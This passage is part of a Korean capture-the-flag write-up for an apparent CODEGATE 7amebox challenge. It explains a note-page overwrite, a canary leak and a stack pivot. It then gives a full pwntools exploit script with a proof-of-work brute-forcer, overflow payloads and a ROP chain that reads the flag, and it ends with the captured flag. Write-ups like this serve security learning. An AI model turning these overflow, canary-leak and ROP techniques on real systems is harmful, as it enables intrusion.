2. 2번 노트의 주소는 노트들의 정보가 담긴 페이지보다 앞에 있습니다. 그러므로 이를 통해 해당 페이지를 덮을 수 있습니다. 2번 노트를 통해서 노트들의 정보를 담는 페이지를 덮어, 3번 노트의 주소에 canary의 값이 적힌 주소를 넣어줍니다.
3. 1번 기능(노트 제목 열람)을 통해서 canary 값을 읽어옵니다.
4. 3번 노트는 stack과 멀기 때문에 더미 값을 넣어줍니다.
5. 4번 노트를 통해 stack을 덮어줍니다. 이 때 stack 영역이 `0xf4000 ~ 0xf5fff` 까지이고, stack 영역까지 덮을 때 sp의 값이 `0xf5fb6` 이기 때문에 ROP를 실행할 수 있는 충분한 공간이 나오지 않습니다. 그러므로 sp를 `0xf5000`으로 rebase 한 뒤 ROP를 실행할 수 있도록 정보를 세팅해줍니다. (`\x00\x3d\x20` 이 `0xf5000`입니다.)

(Proof of work는 인터넷에서 검색하면 나오는 7amebox 2의 코드를 그대로 사용했습니다.)

```python
from pwn import *
from time import sleep
import random
import hashlib, itertools

# proof of work
# https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/rabit
def proof_of_work(prefix, plen, endv):
    charset = string.letters + string.digits

    # Bruteforce bounds
    lower_bound = plen - len(prefix)
    upper_bound = plen - len(prefix)

    # Find proof-of-work candidate
    for p in itertools.chain.from_iterable((''.join(l) for l in itertools.product(charset, repeat=i)) for i in range(lower_bound, upper_bound + 1)):
        # Should be sufficient charset
        candidate = prefix + p
        assert (len(candidate) == plen)

        if ((candidate[:len(prefix)] == prefix) and (hashlib.sha1(candidate).hexdigest()[-6:] == endv)):
            return candidate

    raise Exception("[-] Could not complete proof-of-work...")
    return

HOST ='58.229.253.146'
PORT = 8888

r = remote(HOST, PORT)
# proof of work
print 'proof of work'
r.recvuntil('prefix : ')
prefix = r.recvline().strip()
found = proof_of_work(prefix, 30, '000000')
r.sendline(found)
print 'done'

r10 = 0x59000
page1 = 0xc4000
page2 = 0x1c000
page3 = 0x3a000
page4 = 0xdd000

# First page (dummy)
r.sendline('2')
r.sendline('flag')
r.sendline('aa')
r.sendline('a')

# Second Page (r10 overflow)
r.sendline('2')
r.sendline('a')
r.sendline('\xff') # Overflow
# Main function canary address : 0xf5fd4
r.sendline('a' * (4096 - 1260) + 'a' * (r10 - page2 - 0x1000) +
            '\x03\x00\x00' + '\x00\x31\x00' + '\x00\x07\x00' + '\x54\x3d\x3f')

r.sendline('1')
r.recvuntil('YOUR DIARY')
r.recvuntil('3)')
sleep(0.1)
canary_str = r.recv(3)
canary = ord(canary_str[1]) * 16384 + ord(canary_str[2]) * 128 + ord(canary_str[0])

# Third Page (Actually, Fourth) 
r.sendline('2')
r.sendline('flag')
r.sendline('aa')
r.sendline('a')

# Fourth Page
r.sendline('2')
r.sendline('a')
r.sendline('\xff')

gad_r1r0 = '\x7e\x00\x0c'
flag_str = '\x00\x31\x00'
gad_sysr3r2r1 = '\x4e\x00\x0c'
gad_readr3r2r1 = '\x20\x00\x0c'
gad_write = '\x49\x00\x0c'

payload = 'aaa'
payload += gad_r1r0 + flag_str + '\x01\x00\x00'
payload += gad_sysr3r2r1 + canary_str + '\x00\x0f\x00' + '\x00\x07\x00' + '\x02\x00\x00'
payload += gad_readr3r2r1 + canary_str + '\x50\x00\x00' + '\x00\x07\x00' + '\x01\x00\x00'
payload += gad_write

# sp address in read() is 1007542(0xf5fb6)
r.sendline('a' * (4096-1260) + 'a' * (0xf5000 - page4 - 0x1000) +
           payload + 'a' * (0xf5fb6 - 0xf5000 - len(payload)) +
           canary_str + '\x00\x00\x00' * 3 + '\x66\x00\x01' +
           '\x00\x3d\x20' + '\x64\x00\x01' + '\xff')

r.interactive()
```

이를 통해 얻은 flag는 `CODEGATE{65b729cfa7acfd0c7f01378bc7d6e4a4}`입니다.

